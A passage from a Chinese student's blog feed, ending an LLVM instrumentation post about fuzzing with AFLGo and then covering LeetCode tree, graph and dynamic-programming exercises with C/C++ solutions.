class="string">&quot;for_equal&quot;</span>,Type::<span class="built_in">getInt32Ty</span>(context));</span><br><span class="line">GlobalVariable* for_equal = I-&gt;<span class="built_in">getModule</span>()-&gt;<span class="built_in">getNamedGlobal</span>(<span class="string">&quot;for_equal&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(for_equal)&#123;</span><br><span class="line">    for_equal-&gt;<span class="built_in">setAlignment</span>(<span class="built_in">MaybeAlign</span>(<span class="number">4</span>));</span><br><span class="line">    for_equal-&gt;<span class="built_in">setLinkage</span>(GlobalValue::CommonLinkage);</span><br><span class="line">    Constant* const_int_val = ConstantInt::<span class="built_in">get</span>(Type::<span class="built_in">getInt32Ty</span>(context),<span class="built_in">APInt</span>(<span class="number">32</span>,<span class="number">0</span>));</span><br><span class="line">    for_equal-&gt;<span class="built_in">setInitializer</span>(const_int_val);</span><br><span class="line">    Builder.<span class="built_in">SetInsertPoint</span>(cmp);</span><br><span class="line">    LoadInst *load = Builder.<span class="built_in">CreateLoad</span>(for_equal);</span><br><span class="line">    StoreInst *store = Builder.<span class="built_in">CreateStore</span>(NewInst,for_equal);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;not valid&quot;</span>&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="指令不在basic-block中"><a href="#指令不在basic-block中" class="headerlink" title="指令不在basic block中"></a>指令不在basic block中</h2><p>主要是出现下列错误</p><blockquote><p>error: Instruction referencing instruction not embedded in a basic block!</p></blockquote><p>网上根本搜不到怎么做。我当时只是想获取某个指令的计算结果，并传给send_mem函数，就出现了这种问题。</p><p>出现的原因：使用了以下方式进行指令的插入</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inst = CallInst::<span class="built_in">Create</span>(sendFunc,args);</span><br><span class="line">inst-&gt;<span class="built_in">insertBefore</span>(cmp); <span class="comment">// basic block will not remember!</span></span><br></pre></td></tr></table></figure><p>使用上面的方法，确实能在IR中插入语句，<strong>但是basic block里面不会记载！</strong>因此，我们不能使用这一条指令对应的结果！</p><p>后来我才知道<strong>正确的插入方法</strong>应该是用<code>IRbuilder</code>，先Builder.SetInsertPoint()之后再编写语句，事实上，这样编写也比直接创建指令来得简单很多。</p><h1 id="后期计划"><a href="#后期计划" class="headerlink" title="后期计划"></a>后期计划</h1><ol><li>在IR中使用debugInfo，实现定位变量</li><li>整合我的pass和AFLGo</li></ol><p>其实进展已经比想象中的快了，希望能够顺利的做完毕设！</p>]]></content>
      
      
      <categories>
          
          <category> projects </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode-1</title>
      <link href="/2022/09/14/leetcode-1/"/>
      <url>/2022/09/14/leetcode-1/</url>
      
        <content type="html"><![CDATA[<p>预推免了，来刷一点算法题，ctf我对不起你<br>其实回想学习CTF的这一年半，最快乐的时候还是学习新知识，刚接触heap的那会，还会去学angr和Z3，学逆向，学misc，到现在glibc2.35上来之后逐渐对传统heap chall不感兴趣了。也不知道后面会不会继续打CTF。但是无论如何，他给我的收获都是课堂上知识无法比拟的。<br>下面的算法题主要来自于leetcode。</p><span id="more"></span><h1 id="1339-分裂二叉树的最大乘积"><a href="#1339-分裂二叉树的最大乘积" class="headerlink" title="1339. 分裂二叉树的最大乘积"></a>1339. 分裂二叉树的最大乘积</h1><blockquote><p>给你一棵二叉树，它的根为 root 。请你删除 1 条边，使二叉树分裂成两棵子树，且它们子树和的乘积尽可能大。</p><p>由于答案可能会很大，请你将结果对 10^9 + 7 取模后再返回。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/maximum-product-of-splitted-binary-tree">https://leetcode.cn/problems/maximum-product-of-splitted-binary-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p><img src="/2022/09/14/leetcode-1/image-20220914135619305.png" alt="image-20220914135619305"></p><p>这道题一上来我就愣住了，对于边的删减，一般的二叉树不是对于node的操作吗，该怎么表示边呢？但是仔细想一下就会发现，其实我们只需要计算<strong>从每个node开始往后的子树节点之和</strong>就可以了，之后用总的节点和减掉上面的结果，就能得到两部分和，乘起来就是最终结果。</p><p>但是我发现，我也不会写dfs的代码了(呜呜</p><p>后面是参考的网上的代码，理解了。在dfs()中，就是递归的<strong>计算从每个节点开始的和</strong>(好像这个非常基础)把他存到数组里面，之后其实就不难了。其实计算每个节点的子树和才是这道题的关键。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">long</span>&gt; s;</span><br><span class="line">    <span class="type">long</span> maxv = <span class="number">0</span>; <span class="comment">// value for root only</span></span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="title">dfs</span><span class="params">(TreeNode* root)</span> <span class="comment">// 计算子树和</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">long</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">long</span> left = <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">            <span class="type">long</span> right = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">            max = left+right+root-&gt;val;</span><br><span class="line">            <span class="keyword">if</span>(max &gt; maxv)</span><br><span class="line">            &#123;</span><br><span class="line">                maxv = max; <span class="comment">//root node cnt </span></span><br><span class="line">            &#125;</span><br><span class="line">            s.<span class="built_in">push_back</span>(max);</span><br><span class="line">            <span class="keyword">return</span> max;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProduct</span><span class="params">(TreeNode* root)</span> <span class="comment">// 计算最大乘积</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(root); <span class="comment">// get s</span></span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">long</span> res = (maxv - s[i])*s[i];</span><br><span class="line">            <span class="keyword">if</span>(res&gt;max)</span><br><span class="line">            &#123;</span><br><span class="line">                max = res;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max%mod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>其实想想这个图挺有意思的，想起来了CFG。</p><p><img src="/2022/09/14/leetcode-1/image-20220914140549154.png" alt="image-20220914140549154"></p><h1 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h1><blockquote><p>对于N 个考生，给出了考生间排名高低的M个关系（即&gt;、=、&lt;），求根据 这些信息能否确定考生的排行榜。如果不能，判断无法确定的原因是因为信息不完全还是因为信息包含冲突。</p></blockquote><p><img src="/2022/09/14/leetcode-1/image-20220914142318732.png" alt="image-20220914142318732"></p><p><img src="/2022/09/14/leetcode-1/image-20220914142327223.png" alt="image-20220914142327223"></p><p>(这道题第一眼我是想用z3的…)</p><p>其实这道题是一个图的基本题目，所谓的大于小于，如果我们就把他看成箭头，那么只要判断<strong>图中是否有环</strong>就能确保能够比较所有数据。有环说明数据产生冲突。<strong>如果存在孤立点</strong>那么说明数据不完整。反之数据是完整的。</p><p>因此我们可以用二维数组表示图结构。使用数组寻找环时，可以观察数组对称性，如果对称就说明有环(需要去除a=b时的环的情况)寻找是否有最长路径覆盖，即<strong>有向图中的最长路径</strong>。可以用拓扑排序来解决。回忆一下拓扑排序，如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//b[]为每个点的入度</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">   <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(b[j]==<span class="number">0</span>)&#123;   <span class="comment">//找到一个入度为0的点</span></span><br><span class="line">        ans=j;</span><br><span class="line">        vis[cnt++]=j;</span><br><span class="line">        b[j]--;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">        <span class="keyword">if</span>(a[ans][j]) b[j]--; <span class="comment">//与入度为0的点相连的点的入度减一</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,vis[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;cnt;i++) <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,vis[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2022/09/14/leetcode-1/image-20220914170158840.png" alt="image-20220914170158840"></p><p>还可以用另一种笨一点的方法。源码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">constexpr <span class="keyword">auto</span> MAXNODE = <span class="number">100</span>;;</span><br><span class="line"><span class="type">short</span> graph[MAXNODE][MAXNODE];</span><br><span class="line"><span class="type">short</span> mark[MAXNODE]; <span class="comment">// mark表示自己是否是一个节点的下属</span></span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> count,<span class="type">int</span> father)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 遍历,start表示开始的下标，count是目前已经有多少节点</span></span><br><span class="line"><span class="comment">// 返回：最大路径长度</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> max = count;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXNODE; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i == father)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (graph[start][i] == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 说明这里是reachable的</span></span><br><span class="line"><span class="comment">// 接下来检查是不是以前就是后继</span></span><br><span class="line"><span class="keyword">if</span> (mark[i] == <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">true</span>; <span class="comment">// flag = true说明不合法</span></span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 到这里，这个节点是合法的</span></span><br><span class="line">mark[i] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之后dfs这个节点如果发现途中有mark=1的说明出错了</span></span><br><span class="line">count = dfs(i, count + <span class="number">1</span>,start);</span><br><span class="line">mark[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (max &lt; count)</span><br><span class="line">&#123;</span><br><span class="line">max = count;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> node_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> cons_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; node_cnt &gt;&gt; cons_cnt;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> right = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> op;</span><br><span class="line"><span class="comment">// 创建图</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cons_cnt; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; left &gt;&gt; op &gt;&gt; right;</span><br><span class="line"><span class="keyword">if</span> (op == <span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">graph[right][left] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">graph[left][right] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">// op is =</span></span><br><span class="line">&#123;</span><br><span class="line">graph[right][left] = <span class="number">1</span>; <span class="comment">// 等号是2</span></span><br><span class="line">graph[left][right] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从第一个节点开始遍历，检查是否有环，以及是否能all reach</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> tmp_count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXNODE; i++)</span><br><span class="line">&#123;</span><br><span class="line">count = dfs(i, tmp_count,i);</span><br><span class="line"><span class="keyword">if</span> (max &lt; count)</span><br><span class="line">&#123;</span><br><span class="line">max = count;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;信息包含冲突&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (max == node_cnt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;能确定&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;信息不完全&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要就是dfs()，原理是从每一个结点开始寻找和他相邻的节点，并且在找到和他相邻的节点之后，标记一下这个节点被寻找过(mark数组)，并且从这个结点开始递归。如果碰到两次mark说明出现环。这样全部遍历之后可以得到所有节点开始的有向图的路径。从而和所有节点个数比较，就能得到结果。</p><p>这道题目因为没有benckmark所以只是对于测试的数据通过了测试。</p><h1 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h1><p>这道题其实是之前动态规划练习里面的。leetcode第91题，解码方法。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>今天收获还是不小的，复习了一下树和图的基本算法和数据结构(真 忘得一干二净)，尤其是代码怎么写。明天继续刷题。</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tree </tag>
            
            <tag> graph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dp</title>
      <link href="/2022/08/28/dp/"/>
      <url>/2022/08/28/dp/</url>
      
        <content type="html"><![CDATA[<p>第一次学习动态规划算法，上学期算法课没有选，现在开始补呜呜。</p><span id="more"></span><p>动态规划类问题，感觉写出状态转移方程是难点。这类题目一般要看出来怎么总结出什么是dp数组，转移的过程是什么。接下来通过leetcode上面一些经典的入门题目加深理解。</p><p>简单题：</p><ol><li>斐波那契数(509) √</li><li>爬楼梯(70) √</li><li>使用最小花费爬楼梯(746) √</li><li>最大子数列和(53) √</li></ol><p>入门：</p><ol><li>打家劫舍(198) √</li><li>删除并获得点数(740) √</li><li>解码方法(91) √</li><li>最长递增子序列(300)</li><li>最长递增子序列个数(673)</li><li>买卖股票的最佳时机(122)</li></ol><h1 id="基础题"><a href="#基础题" class="headerlink" title="基础题"></a>基础题</h1><h2 id="斐波那契数-leetcode第509题"><a href="#斐波那契数-leetcode第509题" class="headerlink" title="斐波那契数(leetcode第509题)"></a>斐波那契数(leetcode第509题)</h2><p>这个可以理解为就是介绍了一下什么是状态转移方程。其实斐波那契数列就是一个最最简单的迭代过程。实际上我觉得迭代法实际上就是动态规划(不知道这样想对不对)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="type">int</span> num[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    num[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    num[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num[i%<span class="number">3</span>] = num[(i<span class="number">-1</span>)%<span class="number">3</span>]+num[(i<span class="number">-2</span>)%<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num[n%<span class="number">3</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="爬楼梯-leetcode第746题"><a href="#爬楼梯-leetcode第746题" class="headerlink" title="爬楼梯(leetcode第746题)"></a>爬楼梯(leetcode第746题)</h2><blockquote><p>假设你正在爬楼梯。需要 <code>n</code> 阶你才能到达楼顶。</p><p>每次你可以爬 <code>1</code> 或 <code>2</code> 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p></blockquote><p>这里问的是方法的种类数。其实提示的也比较明显。假设我们用way[i]表示爬到第i层的方法总数，那么很容易得到</p><p>$way[i]  = way[i-1] + way[i-2]$</p><p>仔细一看，这正是斐波那契数。这道题的状态转移方程正好是斐波那契数列，也算是对于斐波那契数列的一个回顾。一个小小的联想练习。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="type">int</span> way[<span class="number">10000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    way[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    way[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        way[i] = way[i<span class="number">-1</span>]+way[i<span class="number">-2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> way[n<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用最小花费爬楼梯-leetcode第746题"><a href="#使用最小花费爬楼梯-leetcode第746题" class="headerlink" title="使用最小花费爬楼梯(leetcode第746题)"></a>使用最小花费爬楼梯(leetcode第746题)</h2><blockquote><p>给你一个整数数组 cost ，其中 cost[i] 是从楼梯第 i 个台阶向上爬需要支付的费用。一旦你支付此费用，即可选择向上爬一个或者两个台阶。</p><p>你可以选择从下标为 0 或下标为 1 的台阶开始爬楼梯。</p><p>请你计算并返回达到楼梯顶部的最低花费。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/min-cost-climbing-stairs">https://leetcode.cn/problems/min-cost-climbing-stairs</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>这道题的条件转移也是比较容易写出来的。观察下式，其中money[i]代表了走到第i层的花费，下面式子的意义也就是，第i层的花费其实就是从i-1层或者i-2层过来，分别加上对应的开销即可。</p><p>$money[i] = min(money[i-1]+cost[i-1],money[i-2]+cost[i-2])$</p><p>以下是代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a &lt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">minCostClimbingStairs</span><span class="params">(<span class="type">int</span>* cost, <span class="type">int</span> costSize)</span>&#123;</span><br><span class="line"><span class="comment">// money[i] = min(money[i-1]+cost[i-1],money[i-2]+cost[i-2])</span></span><br><span class="line">    <span class="type">int</span> money[<span class="number">1010</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    money[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    money[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=costSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        money[i] = min(money[i<span class="number">-1</span>]+cost[i<span class="number">-1</span>],money[i<span class="number">-2</span>]+cost[i<span class="number">-2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> money[costSize];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最大子列和-leetcode第53题"><a href="#最大子列和-leetcode第53题" class="headerlink" title="最大子列和(leetcode第53题)"></a>最大子列和(leetcode第53题)</h2><h3 id="sol1-在线求解法"><a href="#sol1-在线求解法" class="headerlink" title="sol1: 在线求解法"></a>sol1: 在线求解法</h3><p>这道题目很经典，也有很多解题方法。第一种是在线求解法，这种方法比较巧妙，依赖于观察(突然回想起来两年前我在预习数据结构的时候，好像也用这个方法做过这道题，时间过得好快啊)。主要是观察到一旦和小于0，就说明需要重置当前求和的结果为0，相当于是从当前位置开启一段新的数列。否则可以在当前的基础上继续加。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 